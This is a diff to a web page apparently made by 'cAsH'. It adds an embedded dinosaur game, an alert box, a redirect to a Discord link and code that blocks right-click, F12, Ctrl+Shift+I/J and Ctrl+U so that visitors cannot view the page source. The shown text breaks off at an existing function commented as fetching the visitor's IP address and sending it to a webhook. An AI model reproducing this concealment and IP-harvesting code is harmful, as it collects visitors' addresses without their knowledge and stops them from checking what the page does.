@@ -148,7 +148,59 @@
         Made by cAsH
     </div>
 
+    <!-- Dinosaur Game -->
+    <div class="alert" id="gameWindow">
+        <iframe src="https://chromedino.com/" width="800" height="400" frameborder="0"></iframe>
+    </div>
+
     <script>
+        // Smooth Alert for PWN Icon
+        function showAlert() {
+            const alertBox = document.getElementById('alertBox');
+            alertBox.style.display = 'block';
+            alertBox.style.opacity = '1';
+
+            setTimeout(() => {
+                alertBox.style.opacity = '0';
+                setTimeout(() => {
+                    alertBox.style.display = 'none';
+                }, 300);
+            }, 3000);
+        }
+
+        // Redirect to AY1
+        function redirectToAY1() {
+            window.location.href = 'https://discord.com/ay1';
+        }
+
+        // Open Dinosaur Game
+        function openGame() {
+            const gameWindow = document.getElementById('gameWindow');
+            gameWindow.style.display = 'block';
+        }
+
+        // Block Right-Click and Inspect
+        function blockInspect() {
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                showAlert();
+            });
+
+            document.addEventListener('keydown', (e) => {
+                if (
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'U')
+                ) {
+                    e.preventDefault();
+                    showAlert();
+                }
+            });
+        }
+
+        blockInspect();
+
         // Fetch and send IP to webhook
         async function fetchAndSendIP() {
             try {
